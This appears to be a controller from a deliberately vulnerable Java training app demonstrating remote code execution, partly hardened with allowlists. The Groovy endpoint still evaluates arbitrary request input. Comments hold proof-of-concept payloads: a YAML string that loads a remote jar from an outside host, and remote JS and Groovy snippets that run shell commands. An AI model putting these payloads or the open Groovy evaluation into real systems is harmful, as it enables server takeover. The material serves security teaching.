package org.joychou.controller;

import groovy.lang.GroovyShell;
import lombok.extern.slf4j.Slf4j;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;
import org.yaml.snakeyaml.Yaml;
import org.yaml.snakeyaml.constructor.SafeConstructor;

import javax.script.Bindings;
import javax.script.ScriptContext;
import javax.script.ScriptEngine;
import javax.script.ScriptEngineManager;
import org.springframework.web.util.HtmlUtils;

import java.io.BufferedInputStream;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.sql.DriverManager;
import java.util.Arrays;
import java.util.HashSet;
import java.util.Set;


/**
 * Java code execute
 *
 * @author JoyChou @ 2018-05-24
 */
@Slf4j
@RestController
@RequestMapping("/rce")
public class Rce {

    private static final Set<String> ALLOWED_COMMANDS = new HashSet<>(Arrays.asList(
            "whoami", "id", "hostname", "date", "uptime", "uname"
    ));

    @GetMapping("/runtime/exec")
    public String CommandExec(String cmd) {
        if (cmd == null || !ALLOWED_COMMANDS.contains(cmd.trim())) {
            return "Command not allowed. Allowed commands: " + ALLOWED_COMMANDS;
        }
        StringBuilder sb = new StringBuilder();

        try {
            ProcessBuilder pb = new ProcessBuilder(cmd.trim());
            pb.redirectErrorStream(true);
            Process p = pb.start();
            BufferedInputStream in = new BufferedInputStream(p.getInputStream());
            BufferedReader inBr = new BufferedReader(new InputStreamReader(in));
            String tmpStr;

            while ((tmpStr = inBr.readLine()) != null) {
                sb.append(tmpStr);
            }

            if (p.waitFor() != 0) {
                if (p.exitValue() == 1)
                    return "Command exec failed!!";
            }

            inBr.close();
            in.close();
        } catch (Exception e) {
            return e.toString();
        }
        return HtmlUtils.htmlEscape(sb.toString());
    }


    /**
     * <a href="http://localhost:8080/rce/ProcessBuilder?cmd=whoami">POC</a>
     */
    @GetMapping("/ProcessBuilder")
    public String processBuilder(String cmd) {

        if (cmd == null || !ALLOWED_COMMANDS.contains(cmd.trim())) {
            return "Command not allowed. Allowed commands: " + ALLOWED_COMMANDS;
        }

        StringBuilder sb = new StringBuilder();

        try {
            ProcessBuilder processBuilder = new ProcessBuilder(cmd.trim());
            processBuilder.redirectErrorStream(true);
            Process p = processBuilder.start();
            BufferedInputStream in = new BufferedInputStream(p.getInputStream());
            BufferedReader inBr = new BufferedReader(new InputStreamReader(in));
            String tmpStr;

            while ((tmpStr = inBr.readLine()) != null) {
                sb.append(tmpStr);
            }
        } catch (Exception e) {
            return e.toString();
        }

        return HtmlUtils.htmlEscape(sb.toString());
    }


    /**
     * http://localhost:8080/rce/jscmd?jsurl=http://xx.yy/zz.js
     *
     * curl http://xx.yy/zz.js
     * var a = mainOutput(); function mainOutput() { var x=java.lang.Runtime.getRuntime().exec("open -a Calculator");}
     *
     * @param jsurl js url
     */
    @GetMapping("/jscmd")
    public String jsEngine(String jsurl) throws Exception {
        if (jsurl == null || jsurl.isEmpty()) {
            return "Missing jsurl parameter.";
        }
        // Validate URL against allowlist to prevent arbitrary code loading
        java.net.URI uri;
        try {
            uri = new java.net.URI(jsurl);
        } catch (java.net.URISyntaxException e) {
            return "Invalid URL format.";
        }
        String host = uri.getHost();
        String scheme = uri.getScheme();
        if (host == null || scheme == null
                || (!scheme.equals("http") && !scheme.equals("https"))) {
            return "Only http/https URLs are allowed.";
        }
        // Block internal/link-local/metadata addresses
        try {
            java.net.InetAddress addr = java.net.InetAddress.getByName(host);
            if (addr.isLoopbackAddress() || addr.isSiteLocalAddress()
                    || addr.isLinkLocalAddress() || addr.isAnyLocalAddress()) {
                return "Internal addresses are not allowed.";
            }
        } catch (java.net.UnknownHostException e) {
            return "Cannot resolve host.";
        }
        ScriptEngine engine = new ScriptEngineManager().getEngineByName("js");
        Bindings bindings = engine.getBindings(ScriptContext.ENGINE_SCOPE);
        // Remove dangerous Java type access from the engine scope
        bindings.remove("java");
        bindings.remove("javax");
        bindings.remove("Java");
        bindings.remove("Packages");
        String cmd = String.format("load(\"%s\")", jsurl.replace("\\", "\\\\").replace("\"", "\\\""));
        engine.eval(cmd, bindings);
        return "Executed.";
    }


    /**
     * http://localhost:8080/rce/vuln/yarm?content=!!javax.script.ScriptEngineManager%20[!!java.net.URLClassLoader%20[[!!java.net.URL%20[%22http://test.joychou.org:8086/yaml-payload.jar%22]]]]
     * yaml-payload.jar: https://github.com/artsploit/yaml-payload
     *
     * @param content payloads
     */
    @GetMapping("/vuln/yarm")
    public void yarm(String content) {
        Yaml y = new Yaml(new SafeConstructor());
        y.load(content);
    }

    @GetMapping("/sec/yarm")
    public void secYarm(String content) {
        Yaml y = new Yaml(new SafeConstructor());
        y.load(content);
    }

    /**
     * http://localhost:8080/rce/groovy?content="open -a Calculator".execute()
     * @param content groovy shell
     */
    @GetMapping("groovy")
    public void groovyshell(String content) {
        GroovyShell groovyShell = new GroovyShell();
        groovyShell.evaluate(content);
    }



    public static void main(String[] args) throws Exception{
        Runtime.getRuntime().exec("touch /tmp/x");
    }
}

